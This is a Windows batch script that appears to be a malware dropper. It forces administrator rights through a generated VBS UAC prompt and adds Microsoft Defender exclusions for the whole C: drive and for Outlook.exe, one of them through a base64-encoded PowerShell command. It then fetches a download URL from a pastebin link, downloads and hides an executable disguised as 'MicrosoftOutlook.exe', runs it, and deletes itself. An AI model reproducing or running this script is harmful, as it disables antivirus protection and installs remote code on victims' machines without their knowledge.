@echo off
powershell -window hidden -command ""

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo SET UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\'"
    powershell.exe -EncodedCommand "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBDAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAJwBPAHUAdABsAG8AbwBrAC4AZQB4AGUAJwAiAA=="

    set "targetDir=%AppData%\SubDir"
    if not exist "%targetDir%" (
        mkdir "%targetDir%"
    )
    attrib +h "%targetDir%" /s /d
    cd /d "%targetDir%"

    for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest 'https://pastebin.com/raw/jDCi7kMn').Content"') do set fileURL=%%i

    powershell -Command "Invoke-WebRequest '%fileURL%' -OutFile 'MicrosoftOutlook.exe'"

    attrib +h "%targetDir%\MicrosoftOutlook.exe" /s /d
    start MicrosoftOutlook.exe

    timeout /t 5 /nobreak >nul
    del "%~f0"
